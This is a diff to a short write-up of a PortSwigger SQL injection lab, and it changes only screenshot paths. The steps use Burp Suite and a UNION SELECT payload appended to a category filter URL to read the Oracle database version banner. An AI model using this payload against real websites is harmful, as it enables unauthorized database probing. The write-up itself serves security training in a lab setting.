@@ -19,7 +19,7 @@ step 1
 select any category then go to
 burpsuite => proxy => http history => click on =>`/filter?category=Gifts` => send to repeater
 
-![screnshot](images/lab7_fiter_category_gift_repeater.jpg)
+![screnshot](lab7_fiter_category_gift_repeater.jpg)
 
 step 2
 
@@ -27,11 +27,11 @@ step 2
 add `'+UNION+SELECT+NULL,banner+FROM+v$version--`
 `/filter?category=Gifts'+UNION+SELECT+NULL,banner+FROM+v$version--`
 
-![screnshot](images/lab7_oracale_version.jpg)
+![screnshot](lab7_oracale_version.jpg)
 
 step 3
 
 to solve the lab
 add `'+UNION+SELECT+NULL,banner+FROM+v$version--` at the end of URL
 
-![screnshot](images/lab7_solved_lab.jpg)
+![screnshot](portswigger_wsa/P01_server_side_topic/P01_sql_injection/images/lab7_solved_lab.jpg)
